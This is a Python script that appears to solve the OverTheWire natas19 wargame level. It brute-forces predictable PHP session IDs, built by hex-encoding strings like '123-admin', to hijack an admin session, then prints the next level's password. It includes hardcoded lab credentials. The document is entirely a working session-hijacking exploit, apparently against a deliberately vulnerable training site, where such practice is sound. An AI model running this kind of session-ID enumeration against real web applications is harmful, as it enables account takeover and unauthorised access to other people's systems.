import requests, concurrent.futures, re, codecs

URL = "http://natas19.natas.labs.overthewire.org/index.php"
CREDS = ("natas19", "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s")
WORKER = concurrent.futures.ThreadPoolExecutor(max_workers=8)

def check(i):
    res = codecs.encode(('%d-admin' % i).encode("utf8"), "hex")
    cookies = {'PHPSESSID': res.decode("utf8")}
    r = requests.get(URL, cookies=cookies, auth=CREDS)
    return (i,"You are an admin" in r.text)

results = WORKER.map(check, range(640))
for ident,ok in results:
    if ok:
        print("Win: %d" % ident)
        res = codecs.encode(('%d-admin' % ident).encode("utf8"), "hex")
        cookies = {'PHPSESSID': res.decode("utf8")}
        r = requests.get(URL, cookies=cookies, auth=CREDS)
        print(re.search("Password: [^ <]+", r.text).group(0))
        break
    else:
        print("No : %d" % ident)
WORKER.shutdown(False)
